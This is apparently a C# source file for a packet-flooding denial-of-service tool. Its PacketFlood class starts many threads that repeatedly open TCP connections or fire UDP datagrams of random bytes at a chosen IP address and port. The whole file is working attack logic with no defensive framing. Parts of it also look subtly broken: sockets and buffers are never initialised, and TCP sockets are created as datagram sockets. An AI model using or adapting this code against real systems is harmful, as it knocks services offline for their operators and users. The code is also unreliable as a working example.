using GAS.Core.Strings;
using SharpNeatLib.Maths;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core {
    public class PacketFlood : IAttacker {
        #region attack methods
        private void TCPAttack( IPEndPoint trg, DataS data ) {
            #region Connect handler
            data.Conn = new SocketAsyncEventArgs() {
                DisconnectReuseSocket = true,
                RemoteEndPoint = trg,
                SocketFlags = SocketFlags.None,
                UserToken = data
            };
            #endregion
            #region Sent handler
            data.Snd = new SocketAsyncEventArgs() {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None,
                UserToken = data
            };
            #endregion
            #region attach handlers
            data.Snd.Completed += SND;
            data.Conn.Completed += CONNECTED;
            #endregion
            #region if random generate shit else use data field
            if ( this.AllowRandom )
                RefreshBuffer(data);
            else {
                var buf = System.Text.Encoding.ASCII.GetBytes(Data);
            }
            #endregion
            //connect
            if ( !data.s.ConnectAsync(data.Conn) )
                SND(data.s, data.Snd);
        }

        private void UDPAttack( IPEndPoint trg, DataS data ) {
            EventHandler<SocketAsyncEventArgs> _SND = null;
            #region send handler data
            data.Snd = new SocketAsyncEventArgs() {
                DisconnectReuseSocket = true,
                SocketFlags = SocketFlags.None,
                UserToken = data,
                RemoteEndPoint = trg
            };
            #endregion
            //sent handler
            _SND = ( a, b ) => {
                try {
                    //while attacking
                    while ( this.IsFlooding ) {
                        this.Requested++;
                        //generate data if needed
                        if ( this.AllowRandom )
                            RefreshBuffer(data);
                        if ( data.s.SendToAsync(data.Snd) )
                            return;
                    }
                }
                catch { }
            };
            #region attach handlers
            data.Snd.Completed += _SND;
            #endregion
            #region if random generate shit else use data field
            if ( this.AllowRandom )
                RefreshBuffer(data);
            else {
                var buf = System.Text.Encoding.ASCII.GetBytes(Data);
            }
            #endregion
            //connect
            if ( !data.s.SendToAsync(data.Snd) )
                _SND(data, data.Snd);
        }
        #endregion
        #region Constructor
        public PacketFlood( string ip, int port, int proto, int delay, bool resp, string data, bool random, int threadcount ) {
            this.ThreadCount = threadcount;
            WorkingThreads = new Thread[ThreadCount];
            this.Target = Dns.GetHostAddresses(ip)[0].ToString();
            this.Port = port;
            this.Protocol = proto;
            this.Delay = delay;
            this.Resp = resp;
            this.Data = data;
            this.AllowRandom = random;
        }
        #endregion
        #region vars
        int FloodCount;
        public bool Resp, AllowRandom, init = false;
        public string Data;
        private int Protocol;
        private Thread[] WorkingThreads;
        private static int BUFFER_SIZE = 50000;
        FastRandom RNG = new FastRandom();
        #endregion
        #region control
        public override void Start() {
            IsFlooding = true;
            for ( int i = 0; i < ThreadCount; ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i++) ) ;
            init = true;
        }
        public override void Stop() {
            IsFlooding = false;
        }
        #endregion
        #region helper data
        //attack data storage
        class DataS {
            public Socket s;
            public byte[] bytes;
            public SocketAsyncEventArgs Conn, Snd;
        }
        //thread wrapper
        private void bw_DoWork( object sender ) {
            while ( !init ) Thread.Sleep(100);
            try {
                IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(Target), Port);
                while ( IsFlooding ) {
                    switch ( Protocol ) {
                        case 1:
                            try {
                                TCPAttack(RHost, new DataS());
                            }
                            catch { }
                            break;
                        case 2:
                            try {
                                UDPAttack(RHost, new DataS());
                            }
                            catch { }
                            break;
                    }
                }
            }
            catch { }
        }
        #endregion
        #region Async code
        void SND( object a, SocketAsyncEventArgs b ) {
            DataS data = (DataS)a;
            try {
                //while attacking
                while ( this.IsFlooding ) {
                    this.Requested++;
                    //while connected send data
                    while ( this.IsFlooding && b.SocketError == SocketError.Success && ( data.s ).Connected ) {
                        //generate data if needed
                        if ( this.AllowRandom )
                            RefreshBuffer(data);
                        if ( data.s.SendAsync(data.Snd) )
                            return;
                    }
                    //if disconnected && attacking => create new socket
                    if ( this.IsFlooding && !data.s.Connected ) {
                        data.s = CreateSocket(data.s.ProtocolType);
                        ////data.Conn.UserToken = data;
                        ////data.Snd.UserToken = data;

                        //try connect async
                        //if async => exit function, CONNECTED will be invoked by event
                        //else continue looping
                        if ( data.s.ConnectAsync(data.Conn) )
                            return;
                    }
                }
            }
            catch { }
        }
        /// <summary>
        /// Socket.Connected handler
        /// </summary>
        /// <param name="a">DataS with data</param>
        /// <param name="b">SocketAsyncEventArgs</param>
        void CONNECTED( object a, SocketAsyncEventArgs b ) {
            DataS data = (DataS)a;
            try {
                //main attack event loop
                if ( this.IsFlooding ) {
                    //while not connected
                    while ( b.SocketError != SocketError.Success || !data.s.Connected )
                        //if async => exit function, SND will be invoked by event
                        //else try to send data
                        if ( this.IsFlooding )
                            if ( ( data.s ).ConnectAsync(data.Conn) )
                                return;
                    //try to send data async. 
                    //if async => exit function, SND will be invoked by event
                    //else invoke SND
                    if ( this.IsFlooding )
                        if ( !data.s.SendAsync(data.Snd) )
                            SND(a, data.Snd);
                }
            }
            catch { }
        }
        /// <summary>
        /// recreate socket
        /// </summary>
        /// <param name="type"></param>
        /// <returns></returns>
        Socket CreateSocket( ProtocolType type ) {
            return new Socket(AddressFamily.InterNetwork, SocketType.Dgram, type) {
                Blocking = false
            };
        }
        /// <summary>
        /// Fill buffer with random bytes
        /// </summary>
        /// <param name="data"></param>
        void RefreshBuffer( DataS data ) {
            //fill buffer with random
            this.RNG.NextBytes(data.bytes);
            //set buffer as default send data
            data.Snd.SetBuffer(data.bytes, 0, data.bytes.Length);
        }
        #endregion
    }
}